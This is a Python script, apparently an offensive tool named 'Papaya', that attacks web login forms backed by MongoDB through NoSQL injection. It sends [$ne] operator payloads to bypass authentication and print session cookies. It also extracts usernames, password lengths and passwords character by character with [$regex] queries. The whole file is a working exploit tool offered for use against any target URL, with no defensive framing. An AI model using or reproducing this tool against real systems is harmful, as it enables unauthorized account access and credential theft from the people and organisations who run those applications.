#!/usr/bin/env python3

from requests_html import HTMLSession
import requests, sys
import os
try:
    from BeautifulSoup import BeautifulSoup
except ImportError:
    from bs4 import BeautifulSoup

username = "admin"
user_param = "username"
password_param ="password"
success_string = "Welcome back"

def print_options():
    clear_terminal()
    print(
"""[1] Set target username (Current: '{}')
[2] Set username POST parameter (Current: '{}')
[3] Set password POST parameter (Current: '{}')
[4] Set unique success-identifier (Current: '{}')
-------------------------------
[5] Test for vulnerability  .'|'.
[6] Brute force username   /.'|\\ \\
[7] Brute force password   | /|'.|
[8] Bypass login            \ |\/
---------------------        \|/
[0] Exit Papaya
?""".format(username, user_param, password_param, success_string))

def main():
    global success_string, user_param, password_param, page, username
    print_options()
    try:
        choice = input()

        if choice == "1":
            print("[?] Enter username")
            username = input()
        elif choice == "2":
            print("[?] Set username POST parameter")
            user_param = input()
        elif choice == "3":
            print("[?] Set password POST parameter")
            password_param = input()
        elif choice == "4":
            print("[?] Set unique string in positive html response")
            success_string = input()
        elif choice == "5":
            choice_test_vulnerability()
        elif choice == "6":
            choice_username()
        elif choice == "7":
            choice_password()
        elif choice == "8":
            choice_authenticate()
        elif choice == "0":
            print("[!] Exiting...")
            quit()
            return

        main()
    except KeyboardInterrupt:
        return

def choice_test_vulnerability():
    clear_terminal()
    print("[ ] Testing for vulnerability")
    print("[ ] Target: '{}'".format(url))
    test_vulnerability()
    wait()

def choice_username():
    global username
    clear_terminal()
    print("[ ] Getting username...")
    print("[ ] Target: '{}'".format(url))
    username = get_username()
    if not username:
        username = 'admin'
    wait()

def choice_password():
    clear_terminal()
    if username == 'admin':
        print("[ ] Default user 'admin' used. Maybe get a username first")
    print("[ ] Testing password length for user: '{}'".format(username))
    print("[ ] Target: '{}'".format(url))
    pw_length = get_password_length(username)
    if pw_length:
        print("[ ] Testing password for '{}' with length {} ".format(username, pw_length))
        get_password(username, pw_length)
    wait()

def choice_authenticate():
    clear_terminal()
    print("[ ] Bypassing login")
    print("[ ] Target: '{}'".format(url))
    authenticate()
    wait()

def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("""------------------------------
Papaya                       /\\
MongoDB Login Bruteforcer   (  )
---------------------------  `´""")

def wait():
    print("\n[!] Press Enter to get back to main menu")
    input()

def not_vulnerable(coming_from_check=False):
    print("\n[-] Not vulnerable. Check parameters")
    if not coming_from_check:
        print("[?] Did you forget to set the success-identifier?")

def send_sessionless_post(params):
    try:
        return requests.post(url, data=params)
    except KeyboardInterrupt:
        wait()
        main()
    except:
        print("[!] Could not connect to target")
        wait()
        main()

def is_successfull(success_string, response):
    if success_string in str(response.content):
        return True
    return False

def test_vulnerability():
    try:
        session = HTMLSession()

        response_bogus = session.post(url, {
            user_param :'xXbOgUsXx',
            password_param :'xXbOgUsXx'
		})

        response_injection = session.post(url, {
		    user_param + "[$ne]":'xXbOgUsXx',
		    password_param + "[$ne]":'xXbOgUsXx'
		})

        response_bogus = BeautifulSoup(response_bogus.text, 'lxml')
        response_injection = BeautifulSoup(response_injection.text, 'lxml')

        if response_bogus.body == response_injection.body:
            not_vulnerable(True)
        else:
            print("\n[ ] Successful login response:\n{}".format(response_injection.body))
            print("\n[ ] Failed login response:\n{}".format(response_bogus.body))
            print("\n[ ] Successful login response differs from failed login response")
            print("[+] Application appears to be vulnerable!")

            if len(session.cookies.get_dict()):
                print("[+] Response returned cookies. Maybe we found a session cookie?")
                print(session.cookies.get_dict())

            print("\n[ ] Inspect the above responses to find a unique string to identify a successful login and adjust the options accordingly")
    except KeyboardInterrupt:
        wait()
        main()
    except:
        print("[!] Could not connect to target")
        wait()
        main()

def authenticate():
    params = {
        user_param + "[$ne]":'xXbOgUsXx',
        password_param + "[$ne]":'xXbOgUsXx'
    }

    try:
        session = HTMLSession()

        try:
            response = session.post(url, data=params)
        except KeyboardInterrupt:
            return

        if is_successfull(success_string, response):
            print("\n[+] Authenticated!")
            print("[+] Session cookies:")
            print(session.cookies.get_dict())
            return
        else:
            not_vulnerable()
    except KeyboardInterrupt:
        wait()
        main()
    except:
        print("[!] Could not connect to target")
        wait()
        main()

def get_username():
    username = ""
    alphabet = list(map(chr, range(97, 122)))

    while True:
        for c in alphabet:
            #if it appears to be the admin user
            #if not len(username) and c == "a":
            #    continue

            params = {
                user_param + "[$regex]":"^"+username+c+".*",
                password_param + "[$ne]":'xXbOgUsXx'
            }

            response = send_sessionless_post(params)

            if not response:
                not_vulnerable()
                return
            if is_successfull(success_string, response):
                username = username + c
                print("[+] Next character found! User='{}'".format(username))
                break

            if c == alphabet[-1]:
                if len(username):
                    print("[+] User found: '{}'".format(username))
                    return username
                else:
                    not_vulnerable()
                    return

def get_password(username, pw_length):
    password = ""
    alphabet = list(map(chr, range(33, 176)))
    regex_chars = ['.', '^', '*', '+', '-', '?', '$', '\\', '|']
    count = pw_length-1

    while True:
        if count == -1:
            return password
        for c in alphabet:

            if c in regex_chars:
                continue

            params = {
                user_param:username,
                password_param+"[$regex]":password+c+".{"+str(count)+"}"
            }

            response = send_sessionless_post(params)

            if is_successfull(success_string, response):
                if count == 0:
                    print("\n[+] Password found: "+password)
                    return password
                password = password + c
                print("[+] Next character found! Password='{}'...".format(password))
                print("[ ] {} Characters left...".format(count))
                count -= 1
                break

def get_password_length(username):
    pw_length = 50
    while True:
        params = { 
            'username':username,
            'password[$regex]':".{"+str(pw_length)+"}"
        }

        response = send_sessionless_post(params)

        if is_successfull(success_string, response):
            print("[+] Found password length: {}".format(pw_length))
            return pw_length

        if pw_length == 0:
            not_vulnerable()
            return

        pw_length -= 1

if __name__ == "__main__":
    global url

    if len(sys.argv) < 2:
        print("\nTarget URL not supplied.\nUsage: python3 papapy.py http[s]://TARGET")
        quit()
    elif (sys.argv[1][0:7] != "http://") and (sys.argv[1][0:8] != "https://"):
        print("\nTarget URL in wrong format.\nUsage: python3 papapy.py http[s]://TARGET")
        quit()
    else:
        url = sys.argv[1]
        main()
